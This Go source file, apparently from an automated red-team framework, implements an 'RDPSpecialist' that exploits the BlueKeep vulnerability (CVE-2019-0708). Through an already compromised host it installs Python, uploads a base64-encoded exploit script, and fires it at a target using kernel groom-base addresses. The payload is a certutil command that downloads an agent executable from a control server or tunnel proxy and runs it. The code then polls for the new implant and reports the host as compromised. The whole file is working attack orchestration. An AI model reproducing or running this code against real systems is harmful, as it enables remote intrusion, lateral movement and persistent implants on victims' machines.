package specialist

import (
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/hands/trt"
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"
	"time"
)

// RDPSpecialist exploits BlueKeep (CVE-2019-0708) vulnerability via Agent A
// Attack flow: TRT Server -> Agent A -> Target B (via BlueKeep) -> Deploy Agent
type RDPSpecialist struct {
	id          string
	bus         bus.Bus
	ctx         context.Context
	target      string // Target B's IP address
	port        int    // RDP port (3389)
	attackerPaw string // Agent A's PAW (the attacker)
	platform    string // Agent A's platform (windows/linux)
	trtClient   *trt.Client
	// Tunnel proxy info for agent deployment
	tunnelIP   string // IP address of the tunnel proxy agent
	tunnelPort string // Port of the tunnel proxy
}

// GROOM_BASE values for different virtualization environments
// Index 0 (VMWare 15) is used as default, others available for future use
var groomBases = []uint64{
	0xfffffa8018C00000, // 0: VMWare 15 (default)
	0xfffffa8003800000, // 1: Bare metal
	0xfffffa8030c00000, // 2: VMWare 14
	0xfffffa8002407000, // 3: VirtualBox 6
	0xfffffa8018c08000, // 4: VMWare 15.1, AWS
	0xfffffa8102407000, // 5: Hyper-V
	0xfffffa8004428000, // 6: QEMU/KVM
}

// NewRDPSpecialist creates a new RDPSpecialist for BlueKeep exploitation
func NewRDPSpecialist(ctx context.Context, id string, eventBus bus.Bus, target string, port int, attackerPaw string, platform string, trtClient *trt.Client) *RDPSpecialist {
	return &RDPSpecialist{
		id:          id,
		bus:         eventBus,
		ctx:         ctx,
		target:      target,
		port:        port,
		attackerPaw: attackerPaw,
		platform:    platform,
		trtClient:   trtClient,
	}
}

func (r *RDPSpecialist) ID() string {
	return r.id
}

func (r *RDPSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (r *RDPSpecialist) Run() error {
	log.Printf("[%s] Online. BlueKeep (CVE-2019-0708) Specialist targeting %s:%d via Agent %s\n",
		r.id, r.target, r.port, r.attackerPaw)
	return nil
}

func (r *RDPSpecialist) OnEvent(event bus.Event) {
	if event.Type == bus.Command && event.ToAgent == r.id {
		log.Printf("[%s] Received command: %v\n", r.id, event.Payload)
		go func() {
			defer func() {
				if rec := recover(); rec != nil {
					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", r.id, rec, debug.Stack())
					r.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
				}
			}()
			r.executeTask(event)
		}()
	}
}

// executeTask performs BlueKeep exploitation via Agent A
func (r *RDPSpecialist) executeTask(cmdEvent bus.Event) {
	log.Printf("[%s] 🚀 Starting BlueKeep exploitation: %s → %s:%d\n",
		r.id, r.attackerPaw, r.target, r.port)

	if r.trtClient == nil {
		r.reportObservation(cmdEvent.FromAgent, "BlueKeep exploitation failed: TRT Client not available")
		return
	}

	if r.attackerPaw == "" {
		r.reportObservation(cmdEvent.FromAgent, "BlueKeep exploitation failed: No attacker agent PAW specified")
		return
	}

	// Get agents before exploitation to detect new agents
	agentsBefore, _ := r.trtClient.GetAliveAgents()
	beforePAWs := make(map[string]bool)
	for _, a := range agentsBefore {
		beforePAWs[a.Paw] = true
	}

	// Find tunnel proxy for agent deployment
	// Target B needs to connect to a proxy that can reach TRT
	r.findTunnelProxy(agentsBefore)

	// Step 1: Ensure Python is installed on Agent A
	log.Printf("[%s] Step 1: Checking Python on Agent A...\n", r.id)
	if err := r.ensurePythonOnAgent(); err != nil {
		log.Printf("[%s] ⚠️ Python check failed: %v\n", r.id, err)
		// Continue anyway, might already be installed
	}

	// Step 2: Upload BlueKeep exploit script to Agent A
	log.Printf("[%s] Step 2: Uploading BlueKeep exploit script...\n", r.id)
	if err := r.uploadExploitScript(); err != nil {
		r.reportObservation(cmdEvent.FromAgent, fmt.Sprintf("Failed to upload exploit script: %v", err))
		return
	}

	// Step 3: Build Agent deployment command (will be executed on Target B)
	agentCommand := r.buildAgentDeployCommand()
	log.Printf("[%s] Step 3: Agent deploy command: %s\n", r.id, agentCommand)

	// Step 4: Execute BlueKeep exploit from Agent A → Target B
	log.Printf("[%s] Step 4: Executing BlueKeep exploit...\n", r.id)
	success := r.runBlueKeepExploit(agentCommand)

	if !success {
		r.reportObservation(cmdEvent.FromAgent, fmt.Sprintf("BlueKeep exploitation failed on %s:%d", r.target, r.port))
		return
	}

	log.Printf("[%s] ✅ BlueKeep exploit executed successfully!\n", r.id)

	// Step 5: Wait for new agent to register
	log.Printf("[%s] Step 5: Waiting for new agent registration...\n", r.id)
	newAgent := r.pollForNewAgent(beforePAWs, 60*time.Second)

	if newAgent != nil {
		log.Printf("[%s] 🎉 NEW AGENT DEPLOYED! PAW: %s, Host: %s\n", r.id, newAgent.Paw, newAgent.Host)
		r.reportCompromised(newAgent.Paw, newAgent.Host, "windows")
		r.reportFinding(cmdEvent.FromAgent, fmt.Sprintf(
			"CVE-2019-0708 (BlueKeep) exploited on %s:%d - Agent deployed (PAW: %s)",
			r.target, r.port, newAgent.Paw,
		))
	} else {
		log.Printf("[%s] ⚠️ Exploit may have succeeded but no new agent detected\n", r.id)
		r.reportObservation(cmdEvent.FromAgent, fmt.Sprintf(
			"BlueKeep exploit executed on %s:%d but no new agent registered (target may have crashed or rebooted)",
			r.target, r.port,
		))
	}
}

// ensurePythonOnAgent checks if Python is installed on Agent A
func (r *RDPSpecialist) ensurePythonOnAgent() error {
	var checkCmd string
	var installCmd string

	if r.platform == "windows" {
		checkCmd = "python --version 2>&1"
		installCmd = "winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements"
	} else {
		checkCmd = "python3 --version 2>&1 || python --version 2>&1"
		installCmd = "apt-get update && apt-get install -y python3 || yum install -y python3"
	}

	// Check if Python exists
	result, err := r.trtClient.RunCommand("0", r.attackerPaw, r.platform, r.getExecutor(), checkCmd)
	if err == nil && (strings.Contains(result, "Python 3") || strings.Contains(result, "Python 2")) {
		log.Printf("[%s] Python already installed on Agent A: %s\n", r.id, strings.TrimSpace(result))
		return nil
	}

	// Try to install Python
	log.Printf("[%s] Python not found, attempting installation...\n", r.id)
	_, err = r.trtClient.RunCommand("0", r.attackerPaw, r.platform, r.getExecutor(), installCmd)
	if err != nil {
		return fmt.Errorf("failed to install Python: %v", err)
	}

	return nil
}

// uploadExploitScript uploads rdp_bluekeep.py to Agent A
func (r *RDPSpecialist) uploadExploitScript() error {
	// Read the exploit script from local scripts folder
	scriptPath := filepath.Join("scripts", "rdp_bluekeep.py")

	// Try multiple possible paths
	possiblePaths := []string{
		scriptPath,
		filepath.Join("cal-project", "scripts", "rdp_bluekeep.py"),
		filepath.Join("..", "scripts", "rdp_bluekeep.py"),
		"e:\\business\\Cai\\cal-project\\scripts\\rdp_bluekeep.py",
	}

	var scriptContent []byte
	var err error

	for _, path := range possiblePaths {
		scriptContent, err = ioutil.ReadFile(path)
		if err == nil {
			log.Printf("[%s] Found script at: %s\n", r.id, path)
			break
		}
	}

	if scriptContent == nil {
		return fmt.Errorf("could not find rdp_bluekeep.py in any expected location")
	}

	// Base64 encode the script for transmission
	encoded := base64.StdEncoding.EncodeToString(scriptContent)

	var uploadCmd string
	var uploadPath string

	if r.platform == "windows" {
		uploadPath = "$env:TEMP\\bluekeep.py"
		// Use PowerShell directly (not via cmd.exe) to avoid:
		// 1. Quote escaping issues when passing through cmd.exe
		// 2. Command line length limits (~8192 chars in cmd.exe)
		// The script is ~40KB base64, which exceeds cmd.exe limits
		uploadCmd = fmt.Sprintf(`$bytes = [Convert]::FromBase64String('%s'); [IO.File]::WriteAllBytes((Join-Path $env:TEMP 'bluekeep.py'), $bytes)`, encoded)
	} else {
		uploadPath = "/tmp/bluekeep.py"
		// Linux: use base64 decode
		uploadCmd = fmt.Sprintf(`
mkdir -p /tmp
echo '%s' | base64 -d > /tmp/bluekeep.py
chmod +x /tmp/bluekeep.py
`, encoded)
	}

	log.Printf("[%s] Uploading BlueKeep script (%d bytes) to %s...\n", r.id, len(scriptContent), uploadPath)

	// Use PowerShell executor for Windows to handle large base64 strings
	// cmd.exe has ~8192 char limit, but PowerShell can handle much more
	executor := r.getExecutor()
	if r.platform == "windows" {
		executor = "psh" // PowerShell for file upload
	}

	output, err := r.trtClient.RunCommand("0", r.attackerPaw, r.platform, executor, uploadCmd)
	if err != nil {
		return fmt.Errorf("failed to upload script to %s: %v", uploadPath, err)
	}

	// Log any output for debugging
	if output != "" {
		log.Printf("[%s] Upload output: %s\n", r.id, output)
	}

	log.Printf("[%s] Script uploaded successfully to %s\n", r.id, uploadPath)
	return nil
}

// findTunnelProxy finds an agent with tunnel capability that can serve as proxy for Target B
// Priority: 1) Attacker agent's tunnel, 2) Parent agent's tunnel, 3) Any agent with matching subnet
func (r *RDPSpecialist) findTunnelProxy(agents []trt.Agent) {
	// Extract target's network prefix (e.g., 192.168.127.x -> 192.168.127.)
	targetParts := strings.Split(r.target, ".")
	targetPrefix := ""
	if len(targetParts) >= 3 {
		targetPrefix = strings.Join(targetParts[:3], ".") + "."
	}

	log.Printf("[%s] Looking for tunnel proxy in subnet %s*\n", r.id, targetPrefix)

	// Build agent map for quick lookup
	agentMap := make(map[string]trt.Agent)
	for _, a := range agents {
		agentMap[a.Paw] = a
	}

	// Strategy 1: Check if attacker agent has tunnel and matching IP
	if attacker, ok := agentMap[r.attackerPaw]; ok {
		if attacker.TunnelPort != "" && attacker.TunnelPort != "0" {
			// Check if attacker has IP in target's subnet
			if ip := r.findMatchingIP(attacker.HostIPAddrs, targetPrefix); ip != "" {
				r.tunnelIP = ip
				r.tunnelPort = attacker.TunnelPort
				log.Printf("[%s] Using attacker agent's tunnel: %s:%s\n", r.id, r.tunnelIP, r.tunnelPort)
				return
			}
		}
	}

	// Strategy 2: Find any agent with tunnel that has IP in target's subnet
	for _, a := range agents {
		if a.TunnelPort != "" && a.TunnelPort != "0" {
			if ip := r.findMatchingIP(a.HostIPAddrs, targetPrefix); ip != "" {
				r.tunnelIP = ip
				r.tunnelPort = a.TunnelPort
				log.Printf("[%s] Using agent %s's tunnel: %s:%s\n", r.id, a.Paw, r.tunnelIP, r.tunnelPort)
				return
			}
		}
	}

	// Strategy 3: Fallback - use any agent with tunnel and prefer private IP
	for _, a := range agents {
		if a.TunnelPort != "" && a.TunnelPort != "0" {
			if ip := r.findAnyPrivateIP(a.HostIPAddrs); ip != "" {
				r.tunnelIP = ip
				r.tunnelPort = a.TunnelPort
				log.Printf("[%s] Using fallback agent %s's tunnel: %s:%s\n", r.id, a.Paw, r.tunnelIP, r.tunnelPort)
				return
			}
		}
	}

	log.Printf("[%s] No tunnel proxy found, will use TRT server directly\n", r.id)
}

// findMatchingIP finds an IP from the JSON array that matches the given prefix
func (r *RDPSpecialist) findMatchingIP(hostIPAddrs string, prefix string) string {
	// Parse JSON array: "[\"192.168.1.1\", \"10.0.0.1\"]"
	hostIPAddrs = strings.Trim(hostIPAddrs, "[]")
	ips := strings.Split(hostIPAddrs, ",")
	for _, ip := range ips {
		ip = strings.Trim(ip, " \"")
		if strings.HasPrefix(ip, prefix) {
			return ip
		}
	}
	return ""
}

// findAnyPrivateIP finds any private IP from the JSON array
func (r *RDPSpecialist) findAnyPrivateIP(hostIPAddrs string) string {
	hostIPAddrs = strings.Trim(hostIPAddrs, "[]")
	ips := strings.Split(hostIPAddrs, ",")
	for _, ip := range ips {
		ip = strings.Trim(ip, " \"")
		// Prefer private IPs: 192.168.x.x, 10.x.x.x, 172.16-31.x.x
		if strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") ||
			strings.HasPrefix(ip, "172.") {
			return ip
		}
	}
	// Return first IP if no private found
	if len(ips) > 0 {
		return strings.Trim(ips[0], " \"")
	}
	return ""
}

// buildAgentDeployCommand creates the command to deploy agent on Target B
// Note: BlueKeep shellcode has 512 byte limit for command
func (r *RDPSpecialist) buildAgentDeployCommand() string {
	var serverURL string

	// Priority: Use tunnel proxy if available
	if r.tunnelIP != "" && r.tunnelPort != "" {
		serverURL = fmt.Sprintf("http://%s:%s", r.tunnelIP, r.tunnelPort)
		log.Printf("[%s] Using tunnel proxy for agent deployment: %s\n", r.id, serverURL)
	} else {
		// Fallback to TRT server
		serverURL = os.Getenv("TRT_API_URL")
		if serverURL == "" {
			serverURL = "http://192.168.50.10:8080"
		}
		// Replace localhost with real IP
		if strings.Contains(serverURL, "localhost") || strings.Contains(serverURL, "127.0.0.1") {
			agentDownloadURL := os.Getenv("AGENT_DOWNLOAD_URL")
			if agentDownloadURL != "" {
				serverURL = agentDownloadURL
			} else {
				serverURL = "http://192.168.50.10:8080"
			}
		}
		log.Printf("[%s] Using TRT server for agent deployment: %s\n", r.id, serverURL)
	}

	// Use cmd /c with certutil for simpler quoting (avoids nested quote issues)
	// certutil is available on all Windows versions and handles HTTP downloads
	// %TEMP% expands in cmd.exe context to user's temp folder
	return fmt.Sprintf(`cmd /c certutil -urlcache -f %s/agents/windows %%TEMP%%\a.exe && %%TEMP%%\a.exe -server %s`,
		serverURL, serverURL)
}

// runBlueKeepExploit executes the BlueKeep exploit from Agent A to Target B
// groomBases array is preserved for future multi-environment support if needed
func (r *RDPSpecialist) runBlueKeepExploit(command string) bool {
	// Don't specify --groom-base argument, let the script use its default value
	// Testing showed that omitting groom-base works better for current target
	// groomBases[0] (VMWare 15: 0xfffffa8018C00000) can be used if needed later
	log.Printf("[%s] Running BlueKeep exploit (using script default GROOM_BASE, available: 0x%X)\n", r.id, groomBases[0])

	// Build exploit command
	// Usage: python rdp_bluekeep.py [--groom-base INT] HOST[:PORT] "COMMAND"
	var exploitCmd string
	if r.platform == "windows" {
		// Use %TEMP% folder for script location on Windows
		// Run via cmd to expand %TEMP% environment variable
		exploitCmd = fmt.Sprintf(
			`python "%%TEMP%%\bluekeep.py" %s:%d "%s"`,
			r.target, r.port, command,
		)
	} else {
		exploitCmd = fmt.Sprintf(
			`python3 "/tmp/bluekeep.py" %s:%d "%s"`,
			r.target, r.port, command,
		)
	}

	log.Printf("[%s] Executing: %s\n", r.id, exploitCmd)

	// Execute exploit via Agent A
	output, err := r.trtClient.RunCommand("0", r.attackerPaw, r.platform, r.getExecutor(), exploitCmd)
	if err != nil {
		log.Printf("[%s] Exploit command error: %v\n", r.id, err)
	}

	log.Printf("[%s] Exploit output: %s\n", r.id, output)

	// Check for success indicators
	if strings.Contains(output, "Exploit completed") || strings.Contains(output, "completed") {
		log.Printf("[%s] Exploit appears successful\n", r.id)
		return true
	}

	return false
}

// pollForNewAgent checks for new agent registration
func (r *RDPSpecialist) pollForNewAgent(beforePAWs map[string]bool, timeout time.Duration) *trt.Agent {
	deadline := time.Now().Add(timeout)
	pollInterval := 5 * time.Second

	for time.Now().Before(deadline) {
		agents, err := r.trtClient.GetAliveAgents()
		if err != nil {
			log.Printf("[%s] Error polling agents: %v\n", r.id, err)
			time.Sleep(pollInterval)
			continue
		}

		for _, agent := range agents {
			if !beforePAWs[agent.Paw] {
				// New agent found!
				return &agent
			}
		}

		log.Printf("[%s] Waiting for new agent... (%d agents online)\n", r.id, len(agents))
		time.Sleep(pollInterval)
	}

	return nil
}

// getExecutor returns the appropriate executor for the platform
// Note: Use command_prompt on Windows to avoid PowerShell security restrictions
func (r *RDPSpecialist) getExecutor() string {
	if r.platform == "windows" {
		return "command_prompt"
	}
	return "sh"
}

// reportObservation sends observation to the event bus
func (r *RDPSpecialist) reportObservation(toAgent string, observation string) {
	r.bus.Publish(toAgent, bus.Event{
		Type:      bus.Observation,
		FromAgent: r.id,
		ToAgent:   toAgent,
		Payload:   observation,
	})
}

// reportError sends error to the event bus
func (r *RDPSpecialist) reportError(toAgent string, err error) {
	r.bus.Publish(toAgent, bus.Event{
		Type:      bus.Error,
		FromAgent: r.id,
		ToAgent:   toAgent,
		Payload:   err.Error(),
	})
}

// reportFinding sends a verified vulnerability finding
func (r *RDPSpecialist) reportFinding(toAgent string, finding string) {
	r.bus.Publish(toAgent, bus.Event{
		Type:      bus.Finding,
		FromAgent: r.id,
		ToAgent:   toAgent,
		Payload:   finding,
	})
}

// reportCompromised notifies that a new agent was deployed
func (r *RDPSpecialist) reportCompromised(agentPaw string, host string, platform string) {
	// Send to Reporter
	r.bus.Publish("Reporter-01", bus.Event{
		Type:      bus.Compromised,
		FromAgent: r.id,
		ToAgent:   "Reporter-01",
		Payload: map[string]interface{}{
			"agent_paw": agentPaw,
			"host":      host,
			"platform":  platform,
			"method":    "BlueKeep (CVE-2019-0708)",
		},
	})

	// Send to Commander for Deep Dive
	r.bus.Publish("Commander-01", bus.Event{
		Type:      bus.Compromised,
		FromAgent: r.id,
		ToAgent:   "Commander-01",
		Payload: map[string]interface{}{
			"agent_paw": agentPaw,
			"host":      host,
			"platform":  platform,
			"method":    "BlueKeep (CVE-2019-0708)",
		},
	})
}
